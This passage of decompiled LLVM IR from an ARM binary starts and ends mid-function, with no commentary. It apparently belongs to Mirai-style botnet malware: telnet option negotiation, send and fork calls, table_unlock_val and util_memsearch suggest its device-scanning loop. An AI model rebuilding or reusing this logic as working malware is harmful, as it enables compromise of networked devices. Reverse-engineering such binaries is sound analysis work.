  store i8 -4, i8* %v2_10914, align 1
  %v0_10924.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10924.pr.pr, label %.thread114, label %.thread111.dec_label_pc_10928thread-pre-split_crit_edge

.thread111.dec_label_pc_10928thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_10928.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10928

dec_label_pc_10928:                               ; preds = %.thread110, %.thread111.dec_label_pc_10928thread-pre-split_crit_edge
  %v0_10928.pr = phi i32 [ %v0_10928.pr.pre, %.thread111.dec_label_pc_10928thread-pre-split_crit_edge ], [ %v4_10914, %.thread110 ]
  %v2_10928 = icmp ugt i32 %v0_10928.pr, 250
  store i1 %v2_10928, i1* %cpsr_c.global-to-local, align 1
  %v7_10928 = icmp eq i32 %v0_10928.pr, 251
  store i1 %v7_10928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10928, label %bb417, label %.thread114

bb417:                                            ; preds = %dec_label_pc_10928
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10930 = load i32, i32* @r4, align 4
  %v4_10930 = add i32 %v3_10930, 2
  %v5_10930 = inttoptr i32 %v4_10930 to i8*
  store i8 -3, i8* %v5_10930, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_10928, %.thread111, %bb417
  %v0_10934 = load i32, i32* @r5, align 4
  %v1_10934 = add i32 %v0_10934, 4
  %v2_10934 = inttoptr i32 %v1_10934 to i32*
  %v3_10934 = load i32, i32* %v2_10934, align 4
  store i32 %v3_10934, i32* %r0.global-to-local, align 4
  %v0_10938 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10940

dec_label_pc_10940:                               ; preds = %dec_label_pc_10ac8, %.thread114
  %v0_10944 = phi i32 [ %v3_10ae0, %dec_label_pc_10ac8 ], [ %v3_10934, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_1098c, %dec_label_pc_10ac8 ], [ %v0_10938, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_10ac8 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10944 = call i32 @__libc_send(i32 %v0_10944, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_10944, i32* %r0.global-to-local, align 4
  %v0_10948 = load i32, i32* @r5, align 4
  %v1_10948 = add i32 %v0_10948, 24
  %v2_10948 = inttoptr i32 %v1_10948 to i32*
  %v3_10948 = load i32, i32* %v2_10948, align 4
  store i32 %v3_10948, i32* %r2.global-to-local, align 4
  %v0_1094c = load i32, i32* @r7, align 4
  %v1_1094c = add i32 %v0_1094c, 3
  store i32 %v1_1094c, i32* @r7, align 4
  %v3_10950 = icmp uge i32 %v1_1094c, %v3_10948
  store i1 %v3_10950, i1* %cpsr_c.global-to-local, align 1
  %v9_10950 = icmp eq i32 %v1_1094c, %v3_10948
  store i1 %v9_10950, i1* %cpsr_z.global-to-local, align 1
  %v0_10954 = load i32, i32* @r4, align 4
  %v1_10954 = add i32 %v0_10954, 3
  store i32 %v1_10954, i32* @r4, align 4
  %v5_10958 = icmp slt i32 %v1_1094c, %v3_10948
  br i1 %v5_10958, label %dec_label_pc_108b0, label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_108a8.loopexit, %dec_label_pc_108b0, %dec_label_pc_10940, %dec_label_pc_108e8, %dec_label_pc_108bc, %dec_label_pc_1089c, %dec_label_pc_1096c.dec_label_pc_1095c.loopexit_crit_edge
  %v6_10964 = phi i32 [ %v0_10998, %dec_label_pc_1096c.dec_label_pc_1095c.loopexit_crit_edge ], [ %v0_10084, %dec_label_pc_1089c ], [ %v6_10964240, %dec_label_pc_108b0 ], [ %v0_10948, %dec_label_pc_10940 ], [ %v6_10964240, %dec_label_pc_108e8 ], [ %v6_10964240, %dec_label_pc_108bc ], [ %v6_10964240, %dec_label_pc_108a8.loopexit ]
  %v0_1095c = phi i32 [ %v0_1095c.pre.pre, %dec_label_pc_1096c.dec_label_pc_1095c.loopexit_crit_edge ], [ 0, %dec_label_pc_1089c ], [ %v1_108d8, %dec_label_pc_108b0 ], [ %v1_1094c, %dec_label_pc_10940 ], [ %v1_108d8, %dec_label_pc_108e8 ], [ %v1_108d8, %dec_label_pc_108bc ], [ %v2_108d8, %dec_label_pc_108a8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1095c = icmp eq i32 %v0_1095c, 0
  store i1 %v2_1095c, i1* %cpsr_z.global-to-local, align 1
  %tmp418 = icmp slt i32 %v0_1095c, 1
  br i1 %tmp418, label %dec_label_pc_10890, label %bb419

bb419:                                            ; preds = %dec_label_pc_1095c
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_10964 = add i32 %v6_10964, 12
  %v8_10964 = inttoptr i32 %v7_10964 to i32*
  store i32 3, i32* %v8_10964, align 4
  br label %dec_label_pc_10890

dec_label_pc_1096c:                               ; preds = %dec_label_pc_108e0
  store i32 %v2_10970, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1a8e6.263 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_10970, i32* @r0, align 4
  %v0_10980 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_1098c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a8dd.265 to i32), i32* @r1, align 4
  %v0_10994 = call i32 @memcpy()
  store i32 %v0_10994, i32* %r0.global-to-local, align 4
  %v0_10998 = load i32, i32* @r5, align 4
  %v1_10998 = add i32 %v0_10998, 24
  %v2_10998 = inttoptr i32 %v1_10998 to i32*
  %v3_10998 = load i32, i32* %v2_10998, align 4
  %v0_1099c = load i32, i32* @r4, align 4
  %v1_1099c = add i32 %v0_1099c, 2
  store i32 %v1_1099c, i32* %r2.global-to-local, align 4
  %v0_109a0 = load i32, i32* @sl, align 4
  %v2_109a0 = add i32 %v0_109a0, %v3_10998
  store i32 %v2_109a0, i32* @r3, align 4
  %v3_109a4 = icmp uge i32 %v2_109a0, %v1_1099c
  store i1 %v3_109a4, i1* %cpsr_c.global-to-local, align 1
  %v9_109a4 = icmp eq i32 %v2_109a0, %v1_1099c
  store i1 %v9_109a4, i1* %cpsr_z.global-to-local, align 1
  %v2_109a8 = xor i1 %v3_109a4, true
  %v3_109a8 = or i1 %v9_109a4, %v2_109a8
  br i1 %v3_109a8, label %dec_label_pc_1096c.dec_label_pc_1095c.loopexit_crit_edge, label %dec_label_pc_109ac

dec_label_pc_1096c.dec_label_pc_1095c.loopexit_crit_edge: ; preds = %dec_label_pc_1096c
  %v0_1095c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1095c

dec_label_pc_109ac:                               ; preds = %dec_label_pc_1096c
  %v2_109ac = inttoptr i32 %v1_1099c to i8*
  %v3_109ac = load i8, i8* %v2_109ac, align 1
  %v4_109ac = zext i8 %v3_109ac to i32
  store i32 %v4_109ac, i32* %r3.global-to-local, align 4
  %v2_109b0 = icmp ugt i8 %v3_109ac, 30
  store i1 %v2_109b0, i1* %cpsr_c.global-to-local, align 1
  %v7_109b0 = icmp eq i8 %v3_109ac, 31
  store i1 %v7_109b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109b0, label %dec_label_pc_10ac8, label %dec_label_pc_109b8

dec_label_pc_109b8:                               ; preds = %dec_label_pc_109ac
  %v1_109b8 = inttoptr i32 %v0_1099c to i8*
  %v2_109b8 = load i8, i8* %v1_109b8, align 1
  %v3_109b8 = zext i8 %v2_109b8 to i32
  store i32 %v3_109b8, i32* %r3.global-to-local, align 4
  %v2_109bc = icmp ugt i8 %v2_109b8, -4
  store i1 %v2_109bc, i1* %cpsr_c.global-to-local, align 1
  %v7_109bc = icmp eq i8 %v2_109b8, -3
  store i1 %v7_109bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109bc, label %.thread115, label %dec_label_pc_109cc

.thread115:                                       ; preds = %dec_label_pc_109b8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_109b8, align 1
  %v0_109c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_109c8.pr.pr, label %dec_label_pc_108f4, label %.thread115.dec_label_pc_109ccthread-pre-split_crit_edge

.thread115.dec_label_pc_109ccthread-pre-split_crit_edge: ; preds = %.thread115
  %v0_109cc.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109b8, %.thread115.dec_label_pc_109ccthread-pre-split_crit_edge
  %v0_109cc.pr = phi i32 [ %v0_109cc.pr.pre, %.thread115.dec_label_pc_109ccthread-pre-split_crit_edge ], [ %v3_109b8, %dec_label_pc_109b8 ]
  %v2_109cc = icmp ugt i32 %v0_109cc.pr, 250
  store i1 %v2_109cc, i1* %cpsr_c.global-to-local, align 1
  %v7_109cc = icmp eq i32 %v0_109cc.pr, 251
  store i1 %v7_109cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109cc, label %bb420, label %dec_label_pc_108f4

bb420:                                            ; preds = %dec_label_pc_109cc
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_109d4 = load i32, i32* @r4, align 4
  %v4_109d4 = inttoptr i32 %v3_109d4 to i8*
  store i8 -3, i8* %v4_109d4, align 1
  br label %dec_label_pc_108f4

dec_label_pc_109dc:                               ; preds = %dec_label_pc_107e8, %dec_label_pc_10800, %dec_label_pc_107f8, %bb414, %dec_label_pc_107d4, %dec_label_pc_107b8, %dec_label_pc_107cc, %bb413
  %v0_109dc = phi i32 [ %v1_107ac, %dec_label_pc_107d4 ], [ %v1_107ac, %dec_label_pc_107b8 ], [ %v1_107ac, %dec_label_pc_107cc ], [ %v1_107ac, %bb413 ], [ %v1_1080c, %bb414 ], [ %v1_1080c, %dec_label_pc_107f8 ], [ %v1_1080c, %dec_label_pc_10800 ], [ %v1_1080c, %dec_label_pc_107e8 ]
  %v1_109dc = add i32 %v0_109dc, 1
  store i32 %v1_109dc, i32* @r7, align 4
  br label %dec_label_pc_1085c

dec_label_pc_109e4:                               ; preds = %dec_label_pc_106f8, %dec_label_pc_10718, %dec_label_pc_10710, %dec_label_pc_10708, %bb410, %dec_label_pc_106e4, %dec_label_pc_106c0, %dec_label_pc_106dc, %dec_label_pc_106d4, %bb409
  %v0_109e4 = phi i32 [ %v1_106b4, %dec_label_pc_106e4 ], [ %v1_106b4, %dec_label_pc_106c0 ], [ %v1_106b4, %dec_label_pc_106dc ], [ %v1_106b4, %dec_label_pc_106d4 ], [ %v1_106b4, %bb409 ], [ %v1_10724, %bb410 ], [ %v1_10724, %dec_label_pc_10708 ], [ %v1_10724, %dec_label_pc_10710 ], [ %v1_10724, %dec_label_pc_10718 ], [ %v1_10724, %dec_label_pc_106f8 ]
  %v1_109e4 = add i32 %v0_109e4, 1
  store i32 %v1_109e4, i32* @r7, align 4
  br label %dec_label_pc_109e8

dec_label_pc_109e8:                               ; preds = %dec_label_pc_1078c.dec_label_pc_109e8_crit_edge, %dec_label_pc_109e4
  %v0_109e8 = phi i32 [ %v0_109e8.pre, %dec_label_pc_1078c.dec_label_pc_109e8_crit_edge ], [ %v0_10084, %dec_label_pc_109e4 ]
  %v1_109e8 = inttoptr i32 %v0_109e8 to i32*
  %v2_109e8 = load i32, i32* %v1_109e8, align 4
  store i32 %v2_109e8, i32* %r3.global-to-local, align 4
  %v1_109ec = add i32 %v0_109e8, 4
  %v2_109ec = inttoptr i32 %v1_109ec to i32*
  %v3_109ec = load i32, i32* %v2_109ec, align 4
  store i32 %v3_109ec, i32* %r0.global-to-local, align 4
  %v1_109f0 = add i32 %v2_109e8, 12
  %v2_109f0 = inttoptr i32 %v1_109f0 to i8*
  %v3_109f0 = load i8, i8* %v2_109f0, align 1
  %v4_109f0 = zext i8 %v3_109f0 to i32
  store i32 %v4_109f0, i32* %r2.global-to-local, align 4
  %v1_109f4 = inttoptr i32 %v2_109e8 to i32*
  %v2_109f4 = load i32, i32* %v1_109f4, align 4
  store i32 %v2_109f4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_109fc = call i32 @__libc_send(i32 %v3_109ec, i32 %v2_109f4, i32 %v4_109f0, i32 16384)
  store i32 %v4_109fc, i32* %r0.global-to-local, align 4
  %v0_10a00 = load i32, i32* @r5, align 4
  %v1_10a00 = add i32 %v0_10a00, 4
  %v2_10a00 = inttoptr i32 %v1_10a00 to i32*
  %v3_10a00 = load i32, i32* %v2_10a00, align 4
  store i32 %v3_10a00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10a10 = call i32 @__libc_send(i32 %v3_10a00, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10a18 = load i32, i32* @r5, align 4
  %v2_10a18 = add i32 %v1_10a18, 12
  %v3_10a18 = inttoptr i32 %v2_10a18 to i32*
  store i32 4, i32* %v3_10a18, align 4
  br label %dec_label_pc_10890

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10128
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10a2c = call i32 @table_unlock_val(i32 29)
  store i32 %v2_10754, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_10a3c = call i32 @table_retrieve_val(i32 29, i32* nonnull %v2_1075c)
  store i32 %v3_10a3c, i32* %r0.global-to-local, align 4
  %v3_10a40 = load i8, i8* %stack_var_-56, align 1
  %v4_10a40 = sext i8 %v3_10a40 to i32
  store i32 %v3_10a3c, i32* %r2.global-to-local, align 4
  %v1_10a48 = add nsw i32 %v4_10a40, -1
  store i32 %v1_10a48, i32* %r3.global-to-local, align 4
  %v0_10a4c = load i32, i32* @r5, align 4
  %v1_10a4c = add i32 %v0_10a4c, 24
  %v2_10a4c = inttoptr i32 %v1_10a4c to i32*
  %v3_10a4c = load i32, i32* %v2_10a4c, align 4
  store i32 %v3_10a4c, i32* %r1.global-to-local, align 4
  %v0_10a50 = load i32, i32* @sl, align 4
  store i32 %v0_10a50, i32* %r0.global-to-local, align 4
  %v4_10a54 = call i32 @util_memsearch(i32 %v0_10a50, i32 %v3_10a4c, i32 %v3_10a3c, i32 %v1_10a48)
  store i32 %v4_10a54, i32* @r7, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10a60 = call i32 @table_lock_val(i32 29)
  store i32 %v1_10a60, i32* %r0.global-to-local, align 4
  %v0_10a64 = load i32, i32* @r7, align 4
  %v2_10a64 = icmp eq i32 %v0_10a64, -1
  store i1 %v2_10a64, i1* %cpsr_c.global-to-local, align 1
  %v7_10a64 = icmp eq i32 %v0_10a64, -1
  store i1 %v7_10a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a64, label %dec_label_pc_10004.loopexit, label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a20
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a6c = icmp eq i32 %v0_10a64, 0
  store i1 %v2_10a6c, i1* %cpsr_z.global-to-local, align 1
  %tmp421 = icmp slt i32 %v0_10a64, 1
  br i1 %tmp421, label %dec_label_pc_10890, label %dec_label_pc_10a74

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a6c
  %v0_10a74 = load i32, i32* @r5, align 4
  %v1_10a74 = add i32 %v0_10a74, 20
  %v2_10a74 = inttoptr i32 %v1_10a74 to i16*
  %v3_10a74 = load i16, i16* %v2_10a74, align 2
  %v4_10a74 = zext i16 %v3_10a74 to i32
  store i32 %v4_10a74, i32* %r3.global-to-local, align 4
  %v1_10a78 = add i32 %v0_10a74, 16
  %v2_10a78 = inttoptr i32 %v1_10a78 to i32*
  %v3_10a78 = load i32, i32* %v2_10a78, align 4
  store i32 %v3_10a78, i32* %r2.global-to-local, align 4
  store i32 %v2_10a7c, i32* @lr, align 4
  store i32 %v4_10a74, i32* %stack_var_-42, align 4
  store i32 %v3_10a78, i32* %stack_var_-60, align 4
  %v1_10a88 = inttoptr i32 %v0_10a74 to i32*
  %v2_10a88 = load i32, i32* %v1_10a88, align 4
  store i32 %v2_10a88, i32* @r8, align 4
  %v0_10a8c = call i32 @__libc_fork()
  store i32 %v0_10a8c, i32* %r0.global-to-local, align 4
  %v7_10a90 = icmp eq i32 %v0_10a8c, -1
  %.432 = zext i1 %v7_10a90 to i32
  store i32 %.432, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a9c = icmp eq i32 %v0_10a8c, 0
  store i1 %v2_10a9c, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp slt i32 %v0_10a8c, 1
  br i1 %tmp424, label %bb425, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_10a74
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ab0

bb425:                                            ; preds = %dec_label_pc_10a74
  store i32 %.432, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10aa8 = icmp eq i1 %v7_10a90, false
  store i1 %v2_10aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10aa8, label %dec_label_pc_10c5c, label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %.thread121, %bb425
  %v0_10ab0 = load i32, i32* @r5, align 4
  %v1_10ab0 = add i32 %v0_10ab0, 4
  %v2_10ab0 = inttoptr i32 %v1_10ab0 to i32*
  %v3_10ab0 = load i32, i32* %v2_10ab0, align 4
  store i32 %v3_10ab0, i32* %r0.global-to-local, align 4
  %v1_10ab4 = call i32 @__GI___libc_close(i32 %v3_10ab0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10abc = load i32, i32* @r4, align 4
  %v1_10abc = load i32, i32* @r5, align 4
  %v2_10abc = add i32 %v1_10abc, 4
  %v3_10abc = inttoptr i32 %v2_10abc to i32*
  store i32 %v0_10abc, i32* %v3_10abc, align 4
  %v0_10ac0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ac0 = load i32, i32* @r5, align 4
  %v2_10ac0 = add i32 %v1_10ac0, 12
  %v3_10ac0 = inttoptr i32 %v2_10ac0 to i32*
  store i32 %v0_10ac0, i32* %v3_10ac0, align 4
  br label %dec_label_pc_10890

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_109ac
  store i32 %v2_10970, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_10ad4 = add i32 %v0_10998, 4
  %v2_10ad4 = inttoptr i32 %v1_10ad4 to i32*
  %v3_10ad4 = load i32, i32* %v2_10ad4, align 4
  store i32 %v3_10ad4, i32* %r0.global-to-local, align 4
  %v4_10ad8 = call i32 @__libc_send(i32 %v3_10ad4, i32 %v2_10970, i32 3, i32 16384)
  store i32 %v4_10ad8, i32* %r0.global-to-local, align 4
  store i32 %v2_10984, i32* %r1.global-to-local, align 4
  %v0_10ae0 = load i32, i32* @r5, align 4
  %v1_10ae0 = add i32 %v0_10ae0, 4
  %v2_10ae0 = inttoptr i32 %v1_10ae0 to i32*
  %v3_10ae0 = load i32, i32* %v2_10ae0, align 4
  store i32 %v3_10ae0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10940

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10010
  store i32 %.pre, i32* @r0, align 4
  %v1_10af8 = add i32 %v0_10af0, 92
  store i32 %v1_10af8, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10b00 = call i32 @memmove(i32 %.pre, i32 %v1_10af8, i32 192)
  store i32 %v3_10b00, i32* %r0.global-to-local, align 4
  %v0_10b04 = load i32, i32* @r5, align 4
  %v1_10b04 = add i32 %v0_10b04, 24
  %v2_10b04 = inttoptr i32 %v1_10b04 to i32*
  %v3_10b04 = load i32, i32* %v2_10b04, align 4
  %v1_10b08 = add i32 %v3_10b04, -64
  store i32 %v1_10b08, i32* %r3.global-to-local, align 4
  store i32 %v1_10b08, i32* %v2_10b04, align 4
  br label %dec_label_pc_10020

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10164
  %v0_10b14 = load i32, i32* @r5, align 4
  store i32 %v0_10b14, i32* @r0, align 4
  %v0_10b18 = call i32 @setup_connection()
  store i32 %v0_10b18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101a0

dec_label_pc_10b20:                               ; preds = %dec_label_pc_1072c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10b20 = load i8, i8* %stack_var_-56, align 1
  %v4_10b20 = sext i8 %v3_10b20 to i32
  %v0_10b24 = load i32, i32* @r6, align 4
  store i32 %v0_10b24, i32* %r2.global-to-local, align 4
  %v1_10b28 = add nsw i32 %v4_10b20, -1
  store i32 %v1_10b28, i32* %r3.global-to-local, align 4
  %v0_10b2c = load i32, i32* @sl, align 4
  store i32 %v0_10b2c, i32* %r0.global-to-local, align 4
  %v0_10b30 = load i32, i32* @r5, align 4
  %v1_10b30 = add i32 %v0_10b30, 24
  %v2_10b30 = inttoptr i32 %v1_10b30 to i32*
  %v3_10b30 = load i32, i32* %v2_10b30, align 4
  store i32 %v3_10b30, i32* %r1.global-to-local, align 4
  %v4_10b34 = call i32 @util_memsearch(i32 %v0_10b2c, i32 %v3_10b30, i32 %v0_10b24, i32 %v1_10b28)
  store i32 %v4_10b34, i32* %r0.global-to-local, align 4
  %v1_10b38 = add i32 %v4_10b34, 1
  store i32 %v1_10b38, i32* @r7, align 4
  %v2_10b38 = icmp eq i32 %v4_10b34, -1
  store i1 %v2_10b38, i1* %cpsr_c.global-to-local, align 1
  %v7_10b38 = icmp eq i32 %v1_10b38, 0
  store i1 %v7_10b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b38, label %dec_label_pc_10b48, label %dec_label_pc_1078c

dec_label_pc_10b48:                               ; preds = %dec_label_pc_10b20
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10b4c = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10b54 = call i32 @table_lock_val(i32 33)
  store i32 %v1_10b54, i32* %r0.global-to-local, align 4
  %v0_10b58 = load i32, i32* @r5, align 4
  %v1_10b58 = add i32 %v0_10b58, 12
  %v2_10b58 = inttoptr i32 %v1_10b58 to i32*
  %v3_10b58 = load i32, i32* %v2_10b58, align 4
  store i32 %v3_10b58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008.backedge

dec_label_pc_10008.backedge.thread:               ; preds = %dec_label_pc_101cc, %dec_label_pc_102a0, %dec_label_pc_10374, %dec_label_pc_10448, %dec_label_pc_1051c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10010

dec_label_pc_10008.backedge.thread528:            ; preds = %dec_label_pc_10640, %dec_label_pc_103d8, %dec_label_pc_10304, %dec_label_pc_104ac, %dec_label_pc_10230
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10010

dec_label_pc_10008.backedge:                      ; preds = %dec_label_pc_10084, %dec_label_pc_10b48, %dec_label_pc_10c4c
  %v0_10010186 = phi i32 [ %v0_10c54, %dec_label_pc_10c4c ], [ %v0_10b58, %dec_label_pc_10b48 ], [ %v0_10084, %dec_label_pc_10084 ]
  %v0_10008.be = phi i32 [ %v3_10c54, %dec_label_pc_10c4c ], [ %v3_10b58, %dec_label_pc_10b48 ], [ %v3_10084, %dec_label_pc_10084 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10008 = icmp eq i32 %v0_10008.be, 0
  store i1 %v2_10008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10008, label %dec_label_pc_10110, label %dec_label_pc_10010

dec_label_pc_10b60:                               ; preds = %dec_label_pc_ffc0
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_10754, i32* %r3.global-to-local, align 4
  store i32 %v2_10740, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_10b8c = call i32 @getsockopt(i32 %v3_ffb4, i32 1, i32 4, i32 %v2_10754, i32 %v2_10740)
  %v3_10b90 = load i8, i8* %stack_var_-56, align 1
  %v4_10b90 = sext i8 %v3_10b90 to i32
  store i32 %v4_10b90, i32* %r3.global-to-local, align 4
  %v2_10b94 = or i32 %v4_10b90, %v5_10b8c
  store i32 %v2_10b94, i32* %r0.global-to-local, align 4
  %v4_10b94 = icmp eq i32 %v2_10b94, 0
  store i1 %v4_10b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10b94, label %dec_label_pc_10b9c, label %dec_label_pc_10c30

dec_label_pc_10b9c:                               ; preds = %dec_label_pc_10b60
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10ba0 = load i32, i32* @r5, align 4
  %v2_10ba0 = add i32 %v1_10ba0, 12
  %v3_10ba0 = inttoptr i32 %v2_10ba0 to i32*
  store i32 2, i32* %v3_10ba0, align 4
  %v0_10ba4 = call i32 @rand_next()
  %v2_10bac = load i16, i16* bitcast (i16** @global_var_23640.169 to i16*), align 4
  %v3_10bac = zext i16 %v2_10bac to i32
  %v2_10bb0 = udiv i32 %v0_10ba4, %v3_10bac
  %v3_10bb0 = urem i32 %v0_10ba4, %v3_10bac
  store i32 %v2_10bb0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23610.165 to i32), i32* %r3.global-to-local, align 4
  %v2_10bb8 = load i32, i32* @global_var_23610.165, align 4
  store i32 %v2_10bb8, i32* %ip.global-to-local, align 4
  %v1_10bc0 = load i32, i32* @r4, align 4
  %v9_10bc0 = icmp eq i32 %v2_10bb8, %v1_10bc0
  store i1 %v9_10bc0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10bb0, i32* %r1.global-to-local, align 4
  %v7_10bc8 = icmp sgt i32 %v2_10bb8, %v1_10bc0
  br i1 %v7_10bc8, label %dec_label_pc_10bcc, label %dec_label_pc_10c0c

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10b9c
  %v2_10bd0 = load i32, i32* @global_var_2363c.167, align 4
  store i32 %v2_10bd0, i32* %r3.global-to-local, align 4
  store i32 %v1_10bc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10bec

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10bfc, %dec_label_pc_10bec
  %v1_10bdc = add i32 %v0_10bdc, 1
  store i32 %v1_10bdc, i32* %r2.global-to-local, align 4
  %v9_10be0 = icmp eq i32 %v1_10bdc, %v2_10bb8
  %v1_10be4 = add i32 %v0_10be4, 16
  store i32 %v1_10be4, i32* %r3.global-to-local, align 4
  br i1 %v9_10be0, label %dec_label_pc_10c0c.loopexit, label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10bcc
  %v0_10bdc = phi i32 [ %v1_10bdc, %dec_label_pc_10bdc ], [ %v1_10bc0, %dec_label_pc_10bcc ]
  %v0_10be4 = phi i32 [ %v1_10be4, %dec_label_pc_10bdc ], [ %v2_10bd0, %dec_label_pc_10bcc ]
  store i32 %v0_10be4, i32* %r0.global-to-local, align 4
  %v1_10bf0 = add i32 %v0_10be4, 8
  %v2_10bf0 = inttoptr i32 %v1_10bf0 to i16*
  %v3_10bf0 = load i16, i16* %v2_10bf0, align 2
  %v4_10bf0 = zext i16 %v3_10bf0 to i32
  store i32 %v4_10bf0, i32* %r3.global-to-local, align 4
  %tmp426 = icmp ugt i32 %v4_10bf0, %v3_10bb0
  br i1 %tmp426, label %dec_label_pc_10bdc, label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bec
  %v1_10bfc = add i32 %v0_10be4, 10
  %v2_10bfc = inttoptr i32 %v1_10bfc to i16*
  %v3_10bfc = load i16, i16* %v2_10bfc, align 2
  %v4_10bfc = zext i16 %v3_10bfc to i32
  store i32 %v4_10bfc, i32* %r3.global-to-local, align 4
  %v3_10c00 = icmp uge i32 %v4_10bfc, %v3_10bb0
  %v9_10c00 = icmp eq i32 %v4_10bfc, %v3_10bb0
  %v2_10c04 = xor i1 %v3_10c00, true
  %v3_10c04 = or i1 %v9_10c00, %v2_10c04
  br i1 %v3_10c04, label %dec_label_pc_10bdc, label %dec_label_pc_10c10.loopexit

dec_label_pc_10c0c.loopexit:                      ; preds = %dec_label_pc_10bdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10c0c.loopexit, %dec_label_pc_10b9c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c10

